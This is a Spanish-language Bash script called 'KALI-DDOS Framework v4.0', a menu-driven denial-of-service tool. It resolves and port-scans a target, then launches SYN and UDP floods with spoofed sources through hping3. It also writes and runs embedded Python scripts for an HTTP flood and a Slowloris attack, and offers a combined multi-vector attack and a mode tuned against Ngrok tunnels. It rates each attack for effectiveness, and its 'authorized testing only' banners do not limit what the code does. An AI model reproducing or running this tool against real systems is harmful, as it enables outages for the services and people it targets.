#!/usr/bin/env bash
#Desarrollado por zdoskiki ayudado autores anonimos
# KALI-DDOS Framework v4.0
# Advanced Security Assessment & Stress Testing Tool

# Colores mejorados
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
BG_RED='\033[1;41m'
BG_GREEN='\033[1;42m'
RESET='\033[0m'

# Configuraci√≥n personalizable - AJUSTA ESTOS VALORES A TU GUSTO
THREADS=1000
DURATION=120
PACKET_SIZE=1024
TIMEOUT=10
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Variables globales
TARGET=""
PORT=80
ATTACK_PID=""

# Animaci√≥n de carga
spinner() {
    local pid=$1
    local text=$2
    local delay=0.1
    local spin=('‚£∑' '‚£Ø' '‚£ü' '‚°ø' '‚¢ø' '‚£ª' '‚£Ω' '‚£æ')
    
    echo -ne "${CYAN}[ ] ${text}${RESET}"
    
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        for i in "${spin[@]}"; do
            echo -ne "\r${CYAN}[${i}] ${text}${RESET}"
            sleep $delay
        done
    done
    echo -ne "\r${GREEN}[‚úì] ${text}${RESET}\n"
}

# Banner mejorado
print_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "BANNER"
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                KALI-DDOS FRAMEWORK v4.0                  ‚ïë
‚ïë           Advanced Security Assessment Tool              ‚ïë
‚ïë             For Authorized Testing Only                  ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

 ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
 ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
 ‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë
 ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
 ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
BANNER
    echo -e "${RESET}"
    echo -e "${BG_RED}‚ö†Ô∏è  ADVERTENCIA: Solo para pruebas autorizadas y educativas ‚ö†Ô∏è${RESET}"
    echo -e "${BG_RED}   El uso no autorizado es ILEGAL y puede tener consecuencias${RESET}\n"
}

# Verificar root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[‚úó] Debes ejecutar como root${RESET}"
        exit 1
    fi
}

# Verificar dependencias mejorado
check_dependencies() {
    local deps=("hping3" "nmap" "curl" "python3" "dig")
    local missing=()
    
    echo -e "${BLUE}[*] Verificando dependencias...${RESET}"
    
    for dep in "${deps[@]}"; do
        if command -v $dep &> /dev/null; then
            echo -e "${GREEN}    [‚úì] $dep${RESET}"
        else
            echo -e "${RED}    [‚úó] $dep${RESET}"
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Instalando dependencias faltantes...${RESET}"
        apt-get update > /dev/null 2>&1
        
        for dep in "${missing[@]}"; do
            case $dep in
                "hping3") apt-get install -y hping3 > /dev/null 2>&1 ;;
                "nmap") apt-get install -y nmap > /dev/null 2>&1 ;;
                "dig") apt-get install -y dnsutils > /dev/null 2>&1 ;;
            esac
            echo -e "${GREEN}    [‚úì] $dep instalado${RESET}"
        done
    fi
    
    # Instalar dependencias Python
    if ! python3 -c "import requests" &> /dev/null; then
        pip3 install requests > /dev/null 2>&1
        echo -e "${GREEN}    [‚úì] Python requests instalado${RESET}"
    fi
}

# Resolver DNS
resolve_dns() {
    local domain=$1
    if [ -z "$domain" ]; then
        domain=$TARGET
    fi
    
    echo -e "${CYAN}[*] Resolviendo DNS para: $domain${RESET}"
    
    # Obtener IP principal
    local ip=$(dig +short $domain | head -1)
    if [ -n "$ip" ]; then
        echo -e "${GREEN}[‚úì] IP encontrada: $ip${RESET}"
        
        # Obtener todas las IPs
        echo -e "${CYAN}[*] Todas las direcciones IP:${RESET}"
        dig +short $domain | while read record; do
            if [[ $record =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                echo -e "    ${GREEN}üìç $record${RESET}"
            fi
        done
        
        # Informaci√≥n adicional
        echo -e "${CYAN}[*] Informaci√≥n adicional:${RESET}"
        local mx=$(dig +short MX $domain | head -1)
        local ns=$(dig +short NS $domain | head -1)
        
        if [ -n "$mx" ]; then
            echo -e "    ${BLUE}üìß MX: $mx${RESET}"
        fi
        if [ -n "$ns" ]; then
            echo -e "    ${BLUE}üîß NS: $ns${RESET}"
        fi
        
        return 0
    else
        echo -e "${RED}[‚úó] No se pudo resolver el dominio${RESET}"
        return 1
    fi
}

# Obtener objetivo
get_target() {
    echo -e "${CYAN}[*] Configuraci√≥n del objetivo${RESET}"
    
    read -p "Ingresa URL o IP del objetivo: " TARGET
    
    # Si es un dominio, resolver DNS
    if [[ $TARGET =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        resolve_dns $TARGET
    fi
    
    # Validar objetivo
    if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ $TARGET =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        echo -e "${GREEN}[‚úì] Objetivo configurado: $TARGET${RESET}"
        return 0
    else
        echo -e "${RED}[‚úó] Objetivo inv√°lido${RESET}"
        return 1
    fi
}

# Obtener puerto
get_port() {
    read -p "Ingresa el puerto del objetivo (default 80): " input
    PORT=${input:-80}
    echo -e "${GREEN}[‚úì] Puerto: $PORT${RESET}"
}

# Obtener duraci√≥n
get_duration() {
    read -p "Ingresa la duraci√≥n en segundos (default $DURATION): " input
    DURATION=${input:-$DURATION}
    echo -e "${GREEN}[‚úì] Duraci√≥n: ${DURATION}s${RESET}"
}

# Obtener threads
get_threads() {
    read -p "Ingresa el n√∫mero de threads (default $THREADS): " input
    THREADS=${input:-$THREADS}
    echo -e "${GREEN}[‚úì] Threads: $THREADS${RESET}"
}

# Configuraci√≥n personalizada
custom_config() {
    echo -e "${CYAN}[*] Configuraci√≥n actual:${RESET}"
    echo -e "    Threads: $THREADS"
    echo -e "    Duraci√≥n: ${DURATION}s"
    echo -e "    Puerto: $PORT"
    echo ""
    
    get_threads
    get_duration
    get_port
}

# Esc√°ner de puertos
port_scan() {
    echo -e "${CYAN}[*] Iniciando escaneo de puertos...${RESET}"
    
    # Escaneo r√°pido de puertos comunes
    local common_ports="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443"
    
    (nmap -T4 --open -p $common_ports $TARGET 2>/dev/null | grep -E '^[0-9]' > /tmp/nmap_scan.txt) &
    spinner $! "Escaneando puertos comunes"
    
    echo -e "${GREEN}[‚úì] Puertos abiertos encontrados:${RESET}"
    if [ -s /tmp/nmap_scan.txt ]; then
        while read line; do
            local port=$(echo $line | cut -d'/' -f1)
            local service=$(echo $line | cut -d'/' -f3)
            local state=$(echo $line | cut -d'/' -f2)
            echo -e "    ${GREEN}üõ°Ô∏è  Puerto $port: $service ($state)${RESET}"
        done < /tmp/nmap_scan.txt
    else
        echo -e "    ${RED}No se encontraron puertos abiertos${RESET}"
    fi
    
    rm -f /tmp/nmap_scan.txt
}

# Informaci√≥n del sistema
system_info() {
    echo -e "${CYAN}[*] Informaci√≥n del sistema:${RESET}"
    echo -e "${BLUE}    CPU: $(top -bn1 | grep "Cpu(s)" | awk '{print $2}')% uso${RESET}"
    echo -e "${BLUE}    Memoria: $(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2}') usado${RESET}"
    echo -e "${BLUE}    Uptime: $(uptime -p | sed 's/up //')${RESET}"
    echo -e "${BLUE}    IP Local: $(hostname -I | awk '{print $1}')${RESET}"
}

# Ataque SYN Flood - ALTAMENTE EFECTIVO
syn_flood() {
    echo -e "${YELLOW}[*] Iniciando SYN Flood...${RESET}"
    echo -e "${RED}[!] ‚ö° Este ataque es muy efectivo para saturar servicios${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    # Ataque principal con hping3
    for i in $(seq 1 $((THREADS / 10))); do
        hping3 --syn --flood --rand-source --data $PACKET_SIZE $TARGET -p $PORT 2>/dev/null &
    done
    
    # Ataque secundario con SYN
    for i in $(seq 1 $((THREADS / 20))); do
        nping --tcp -p $PORT --flags syn --rate $((THREADS / 100)) -c $((DURATION * 10)) $TARGET 2>/dev/null &
    done
    
    ATTACK_PID=$!
    echo -e "${GREEN}[‚úì] SYN Flood ejecut√°ndose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: üöÄ ALTA - Satura la tabla de conexiones${RESET}"
    
    # Monitorizar
    while [ $(date +%s) -lt $end_time ]; do
        echo -e "${YELLOW}[*] Enviando paquetes SYN... ($(($(date +%s) - start_time))s/${DURATION}s)${RESET}"
        sleep 5
    done
    
    cleanup
    echo -e "${GREEN}[‚úì] SYN Flood finalizado${RESET}"
}

# Ataque UDP Flood - VOLUM√âTRICO
udp_flood() {
    echo -e "${YELLOW}[*] Iniciando UDP Flood...${RESET}"
    echo -e "${RED}[!] üåä Ataque volum√©trico - Consume ancho de banda${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    # Ataque principal con hping3
    for i in $(seq 1 $((THREADS / 5))); do
        hping3 --udp --flood --rand-source --data $PACKET_SIZE $TARGET -p $PORT 2>/dev/null &
    done
    
    ATTACK_PID=$!
    echo -e "${GREEN}[‚úì] UDP Flood ejecut√°ndose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: üåä MEDIA-ALTA - Consume recursos de red${RESET}"
    
    # Monitorizar
    while [ $(date +%s) -lt $end_time ]; do
        echo -e "${YELLOW}[*] Enviando paquetes UDP... ($(($(date +%s) - start_time))s/${DURATION}s)${RESET}"
        sleep 5
    done
    
    cleanup
    echo -e "${GREEN}[‚úì] UDP Flood finalizado${RESET}"
}

# Ataque HTTP Flood - CAPA DE APLICACI√ìN
http_flood() {
    echo -e "${YELLOW}[*] Iniciando HTTP Flood...${RESET}"
    echo -e "${RED}[!] üåê Ataque de capa de aplicaci√≥n - Consume recursos del servidor${RESET}"
    
    cat > /tmp/http_flood.py << 'EOF'
import requests
import threading
import time
import random
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuraci√≥n
target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
thread_count = int(sys.argv[4]) if len(sys.argv) > 4 else 500

print(f"[*] Iniciando HTTP Flood")
print(f"[*] Objetivo: {target}:{port}")
print(f"[*] Duraci√≥n: {duration}s")
print(f"[*] Threads: {thread_count}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
]

paths = ["/", "/index.html", "/home", "/api", "/admin", "/login", "/test"]
stop = False
requests_count = 0

def attacker():
    global stop, requests_count
    session = requests.Session()
    while not stop:
        try:
            url = f"http://{target}:{port}{random.choice(paths)}"
            headers = {
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            session.get(url, headers=headers, timeout=5, verify=False)
            requests_count += 1
            if requests_count % 50 == 0:
                print(f"[+] Requests enviados: {requests_count}")
        except:
            pass

# Iniciar threads
threads = []
for i in range(thread_count):
    t = threading.Thread(target=attacker)
    t.daemon = True
    threads.append(t)
    t.start()

# Ejecutar por el tiempo especificado
time.sleep(duration)
stop = True
print(f"[!] Total requests enviados: {requests_count}")
EOF

    python3 /tmp/http_flood.py "$TARGET" "$PORT" "$DURATION" "$THREADS" &
    ATTACK_PID=$!
    
    echo -e "${GREEN}[‚úì] HTTP Flood ejecut√°ndose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: ‚ö° ALTA - Consume CPU/RAM del servidor${RESET}"
    
    # Esperar
    sleep $DURATION
    
    # Limpiar
    kill $ATTACK_PID 2>/dev/null
    rm -f /tmp/http_flood.py
    echo -e "${GREEN}[‚úì] HTTP Flood finalizado${RESET}"
}

# Ataque Slowloris - BAJO ANCHO DE BANDA
slowloris_attack() {
    echo -e "${YELLOW}[*] Iniciando Slowloris...${RESET}"
    echo -e "${RED}[!] üêå Ataque lento pero efectivo - Bajo consumo de ancho de banda${RESET}"
    
    cat > /tmp/slowloris.py << 'EOF'
import socket
import threading
import time
import random
import sys

target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
sockets_count = int(sys.argv[4]) if len(sys.argv) > 4 else 500

print(f"[*] Iniciando Slowloris")
print(f"[*] Objetivo: {target}:{port}")
print(f"[*] Duraci√≥n: {duration}s")
print(f"[*] Sockets: {sockets_count}")

sockets = []
stop = False

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
        s.send("Content-length: 42\r\n".encode())
        return s
    except:
        return None

def maintain_connections():
    global stop
    while not stop:
        current_count = len(sockets)
        if current_count < sockets_count:
            s = create_socket()
            if s:
                sockets.append(s)
        
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                sockets.remove(s)
        
        time.sleep(15)

print(f"[*] Creando conexiones lentas...")
maintain_thread = threading.Thread(target=maintain_connections)
maintain_thread.start()

time.sleep(duration)
stop = True

for s in sockets:
    try:
        s.close()
    except:
        pass

print(f"[!] Slowloris finalizado - Conexiones mantenidas: {len(sockets)}")
EOF

    python3 /tmp/slowloris.py "$TARGET" "$PORT" "$DURATION" "$THREADS" &
    ATTACK_PID=$!
    
    echo -e "${GREEN}[‚úì] Slowloris ejecut√°ndose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: üéØ MEDIA - Ideal para servidores con l√≠mite de conexiones${RESET}"
    
    # Esperar
    sleep $DURATION
    
    # Limpiar
    kill $ATTACK_PID 2>/dev/null
    rm -f /tmp/slowloris.py
    echo -e "${GREEN}[‚úì] Slowloris finalizado${RESET}"
}

# Ataque Mixto - M√ÅXIMA EFECTIVIDAD
mixed_attack() {
    echo -e "${YELLOW}[*] Iniciando Ataque Mixto Multi-Vector...${RESET}"
    echo -e "${RED}[!] üí• COMBINACI√ìN M√ÅXIMA - Todos los vectores simult√°neos${RESET}"
    
    local start_time=$(date +%s)
    local end_time=$((start_time + DURATION))
    
    echo -e "${CYAN}[!] Lanzando todos los vectores de ataque...${RESET}"
    
    # Iniciar todos los ataques
    (http_flood) &
    (syn_flood) &
    (udp_flood) &
    (slowloris_attack) &
    
    ATTACK_PID=$!
    echo -e "${GREEN}[‚úì] Ataque Mixto ejecut√°ndose por ${DURATION}s${RESET}"
    echo -e "${CYAN}[!] Efectividad: üíÄ M√ÅXIMA - Combinaci√≥n de todas las t√©cnicas${RESET}"
    
    # Mostrar progreso
    while [ $(date +%s) -lt $end_time ]; do
        local elapsed=$(( $(date +%s) - start_time ))
        echo -e "${YELLOW}[*] Ataque en progreso... (${elapsed}s/${DURATION}s)${RESET}"
        echo -e "${RED}[!] ‚ö° HTTP Flood + üåä UDP Flood + üöÄ SYN Flood + üêå Slowloris${RESET}"
        sleep 10
    done
    
    cleanup
    echo -e "${GREEN}[‚úì] Ataque Mixto finalizado${RESET}"
}

# Ataque de estr√©s para Ngrok
ngrok_stress_test() {
    echo -e "${YELLOW}[*] Iniciando prueba de estr√©s especial para Ngrok...${RESET}"
    echo -e "${RED}[!] üéØ Optimizado para servicios tunnel como Ngrok${RESET}"
    
    # Configuraci√≥n optimizada para Ngrok
    local original_threads=$THREADS
    local original_duration=$DURATION
    
    THREADS=800  # Optimizado para Ngrok
    DURATION=90  # Duraci√≥n extendida
    
    echo -e "${CYAN}[!] Ajustando par√°metros para Ngrok...${RESET}"
    echo -e "${CYAN}    Threads: $THREADS | Duraci√≥n: ${DURATION}s${RESET}"
    
    # Usar HTTP Flood optimizado
    http_flood
    
    # Restaurar configuraci√≥n original
    THREADS=$original_threads
    DURATION=$original_duration
}

# Limpiar procesos
cleanup() {
    echo -e "${YELLOW}[*] Limpiando procesos...${RESET}"
    pkill -f hping3 2>/dev/null
    pkill -f python3 2>/dev/null
    pkill -f nping 2>/dev/null
    pkill -f curl 2>/dev/null
    rm -f /tmp/*.py 2>/dev/null
    ATTACK_PID=""
    echo -e "${GREEN}[‚úì] Limpieza completada${RESET}"
}

# Test de conectividad
test_connectivity() {
    echo -e "${CYAN}[*] Probando conectividad con $TARGET...${RESET}"
    if ping -c 2 -W 2 $TARGET &>/dev/null; then
        echo -e "${GREEN}[‚úì] Objetivo responde a ping${RESET}"
    else
        echo -e "${YELLOW}[!] Objetivo no responde a ping${RESET}"
    fi
    
    if curl -s --connect-timeout 5 "http://$TARGET:$PORT" &>/dev/null; then
        echo -e "${GREEN}[‚úì] Servicio HTTP activo${RESET}"
    else
        echo -e "${RED}[‚úó] Servicio HTTP no responde${RESET}"
    fi
}

# Men√∫ principal
show_main_menu() {
    while true; do
        clear
        print_banner
        
        echo -e "${CYAN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó${RESET}"
        echo -e "${CYAN}‚ïë                   MEN√ö PRINCIPAL                         ‚ïë${RESET}"
        echo -e "${CYAN}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${RESET}"
        echo ""
        
        # Informaci√≥n actual
        echo -e "${PURPLE}üéØ Objetivo: $TARGET | üîå Puerto: $PORT | ‚è±Ô∏è Duraci√≥n: ${DURATION}s | üöÄ Threads: $THREADS${RESET}"
        echo ""
        
        echo -e "${GREEN}‚îå‚îÄ‚îÄ‚îÄ INFORMACI√ìN Y RECONOCIMIENTO ‚îÄ‚îÄ‚îÄ${RESET}"
        echo -e "${GREEN}‚îÇ 1. Resolver DNS y informaci√≥n del objetivo"
        echo -e "‚îÇ 2. Escanear puertos y servicios"
        echo -e "‚îÇ 3. Informaci√≥n del sistema"
        echo -e "‚îÇ 4. Test de conectividad"
        echo -e "‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ"
        echo ""
        echo -e "${YELLOW}‚îå‚îÄ‚îÄ‚îÄ PRUEBAS DE ESTR√âS ‚îÄ‚îÄ‚îÄ${RESET}"
        echo -e "${YELLOW}‚îÇ 5. HTTP Flood Avanzado    ‚ö° ALTA EFECTIVIDAD"
        echo -e "‚îÇ 6. SYN Flood               üöÄ ALTA EFECTIVIDAD" 
        echo -e "‚îÇ 7. UDP Flood               üåä VOLUM√âTRICO"
        echo -e "‚îÇ 8. Slowloris Attack        üêå BAJO ANCHO DE BANDA"
        echo -e "‚îÇ 9. Ataque Mixto            üí• M√ÅXIMA EFECTIVIDAD"
        echo -e "‚îÇ 10. Prueba Ngrok Especial  üéØ OPTIMIZADO"
        echo -e "‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ"
        echo ""
        echo -e "${RED}‚îå‚îÄ‚îÄ‚îÄ CONFIGURACI√ìN ‚îÄ‚îÄ‚îÄ${RESET}"
        echo -e "${RED}‚îÇ C. Configurar par√°metros"
        echo -e "‚îÇ S. Configurar objetivo/puerto"
        echo -e "‚îÇ X. Limpiar procesos"
        echo -e "‚îÇ 0. Salir"
        echo -e "‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ${RESET}"
        echo ""
        
        read -p "Selecciona una opci√≥n: " choice
        
        case $choice in
            1) resolve_dns ;;
            2) port_scan ;;
            3) system_info ;;
            4) test_connectivity ;;
            5) http_flood ;;
            6) syn_flood ;;
            7) udp_flood ;;
            8) slowloris_attack ;;
            9) mixed_attack ;;
            10) ngrok_stress_test ;;
            C|c) custom_config ;;
            S|s) 
                get_target
                get_port
                ;;
            X|x) cleanup ;;
            0) 
                cleanup
                echo -e "${YELLOW}[!] Saliendo... ¬°Usa responsablemente!${RESET}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Opci√≥n inv√°lida${RESET}"
                sleep 1
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[!] Presiona Enter para continuar...${RESET}"
        read
    done
}

# Funci√≥n principal
main() {
    check_root
    print_banner
    check_dependencies
    
    echo -e "${YELLOW}[!] Este software es solo para pruebas de seguridad autorizadas${RESET}"
    echo -e "${YELLOW}[!] El uso no autorizado es ILEGAL y est√° estrictamente prohibido${RESET}"
    echo ""
    
    # Configuraci√≥n inicial
    if [ -z "$TARGET" ]; then
        get_target || exit 1
        get_port
    fi
    
    show_main_menu
}

# Manejar Ctrl+C
trap 'echo -e "\n${RED}[!] Interrumpido. Limpiando...${RESET}"; cleanup; exit 1' SIGINT

# Ejecutar
if [[ "$1" == "--help" ]]; then
    echo "Uso: $0"
    echo "KALI-DDOS Framework v4.0 - Advanced Security Testing Tool"
    echo ""
    echo "Efectividad de ataques:"
    echo "  HTTP Flood    ‚ö° ALTA - Consume recursos del servidor"
    echo "  SYN Flood     üöÄ ALTA - Satura tabla de conexiones"  
    echo "  UDP Flood     üåä MEDIA-ALTA - Consume ancho de banda"
    echo "  Slowloris     üéØ MEDIA - Ideal para l√≠mites de conexi√≥n"
    echo "  Ataque Mixto  üí• M√ÅXIMA - Combinaci√≥n de todas las t√©cnicas"
    echo ""
    echo "‚ö†Ô∏è  SOLO PARA USO EDUCATIVO Y AUTORIZADO ‚ö†Ô∏è"
else
    main
fi
